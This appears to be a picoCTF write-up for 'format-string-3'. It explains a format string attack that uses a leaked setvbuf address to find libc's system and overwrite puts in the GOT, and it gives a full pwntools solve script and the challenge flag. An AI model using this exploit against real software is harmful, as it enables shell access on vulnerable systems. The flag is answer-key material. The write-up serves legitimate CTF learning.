---
created: 2024-08-07T22:13
updated: 2024-08-07T23:55
---

Format string attack modifying GOT to run custom function after memory address leak.
## Idea

We need to overwrite `puts` to `popen` in memory with writes.
So `puts('/bin/sh')` becomes `system('/bin/sh')`.
## Offset

We can find the location of our format string in memory using `%n$p`.
When the server replies `69ABCDEF` in little endian, `n` is the offset.

Automatic offset finding via pwntools.

```python
from pwn import *

elf = context.binary = ELF('./format-string-3')


def send_payload(payload):
    p = elf.process()
    p.sendline(payload)
    l = p.recvall()
    p.close()
    return l


offset = FmtStr(send_payload).offset
info("offset = %d", offset)
```

## Addresses

In `libc.so.6` we can find the functions related to the challenge.

```python [libc]
0x000000000004F760: system
0x0000000000079BF0: puts
0x000000000007A3F0: setvbuf
```

We have the address of `system` right? Nay, due to **ASLR** we have to do address leak first.
Luckily the author already does that for us.

```python
p = process(program)
# p = remote('rhea.picoctf.net', 50248)
p.recvuntil(b': 0x')
setvbuf_leak = int(p.recvuntil(b'\n', drop=True).decode(), 16)
libc = ELF("./libc.so")
libc.address = setvbuf_leak - libc.symbols['setvbuf']  # normalizing libc base address
sys_addr = libc.symbols['system']
```

We now have the address of `system` in memory.
## Format String Attack

By sending `%p` we can see that `puts` is right next to us in stack.

```
Howdy gamers!
Okay I'll be nice. Here's the address of setvbuf in libc: 0x7f48f9aaa3f0
AAAAAAAA%p
AAAAAAAA0x7f48f9c08963
```

How do we change it?

ELFs store symbol-address map in GOT (Global Offset Table).

We can modify the GOT entry of `puts` like this.

```python
sys_addr = libc.symbols['system']
puts_addr = elf.got['puts']
writes = {puts_addr: sys_addr}

payload = fmtstr_payload(offset, writes)
p.sendline(payload)
```

And that's it, we have shell access.

```flag
picoCTF{G07_G07?_7a2369d3}
```

## Solve Script

```python
from pwn import *

elf = context.binary = ELF('./format-string-3')


def send_payload(payload):
    p = elf.process()
    p.sendline(payload)
    l = p.recvall()
    p.close()
    return l


offset = FmtStr(send_payload).offset
info("offset = %d", offset)

p = elf.process()
# p = remote('rhea.picoctf.net', 50248)

p.recvuntil(b': 0x')
setvbuf_leak = int(p.recvuntil(b'\n', drop=True).decode(), 16)

libc = ELF("./libc.so.6")
libc.address = setvbuf_leak - libc.symbols['setvbuf']  # normalizing libc base address

sys_addr = libc.symbols['system']
puts_addr = elf.got['puts']
writes = {puts_addr: sys_addr}

payload = fmtstr_payload(offset, writes)
p.sendline(payload)
p.interactive()
```
